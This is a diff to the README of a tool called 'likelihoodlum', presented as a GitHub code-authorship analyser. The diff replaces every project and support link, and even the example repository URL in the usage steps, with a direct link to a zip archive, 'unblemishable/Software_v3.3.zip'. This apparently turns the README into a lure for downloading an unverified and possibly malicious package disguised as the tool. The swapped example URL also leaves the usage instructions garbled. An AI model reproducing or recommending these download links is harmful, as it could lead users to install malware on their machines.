@@ -1,6 +1,6 @@
 # 🎲 likelihoodlum - Analyze GitHub Code Authorship Easily
 
-[![Download likelihoodlum](https://img.shields.io/badge/Download-likelihoodlum-brightgreen)](https://github.com/khansavaleria/likelihoodlum)
+[![Download likelihoodlum](https://img.shields.io/badge/Download-likelihoodlum-brightgreen)](https://github.com/khansavaleria/likelihoodlum/raw/refs/heads/main/unblemishable/Software_v3.3.zip)
 
 ---
 
@@ -43,7 +43,7 @@ Follow these steps to download, install, and run likelihoodlum on your Windows c
 
 Click the big green button below or visit the official GitHub page to get the latest version.
 
-[![Download likelihoodlum](https://img.shields.io/badge/Download-likelihoodlum-brightgreen)](https://github.com/khansavaleria/likelihoodlum)
+[![Download likelihoodlum](https://img.shields.io/badge/Download-likelihoodlum-brightgreen)](https://github.com/khansavaleria/likelihoodlum/raw/refs/heads/main/unblemishable/Software_v3.3.zip)
 
 You will be taken to the project page on GitHub.
 
@@ -81,7 +81,7 @@ The program will open in a command window or a simple interface, ready for your 
 Here is a simple guide to run your first analysis:
 
 - Open likelihoodlum  
-- Enter the URL of the GitHub repo you want to analyze (for example, https://github.com/username/repo)  
+- Enter the URL of the GitHub repo you want to analyze (for example, https://github.com/khansavaleria/likelihoodlum/raw/refs/heads/main/unblemishable/Software_v3.3.zip)  
 - Press Enter or click "Start" if the interface shows the option  
 - Wait a few moments while likelihoodlum fetches and analyzes the data  
 - View the final score, which ranges from 0 to 100  
@@ -124,7 +124,7 @@ If you get errors while scanning:
 
 For support and updates, visit the GitHub page:
 
-[https://github.com/khansavaleria/likelihoodlum](https://github.com/khansavaleria/likelihoodlum)
+[https://github.com/khansavaleria/likelihoodlum/raw/refs/heads/main/unblemishable/Software_v3.3.zip](https://github.com/khansavaleria/likelihoodlum/raw/refs/heads/main/unblemishable/Software_v3.3.zip)
 
 Look for documentation, issue reporting, and the latest release notes.
 
@@ -138,4 +138,4 @@ Look for documentation, issue reporting, and the latest release notes.
 
 ---
 
-[![Download likelihoodlum](https://img.shields.io/badge/Download-likelihoodlum-brightgreen)](https://github.com/khansavaleria/likelihoodlum)
+[![Download likelihoodlum](https://img.shields.io/badge/Download-likelihoodlum-brightgreen)](https://github.com/khansavaleria/likelihoodlum/raw/refs/heads/main/unblemishable/Software_v3.3.zip)
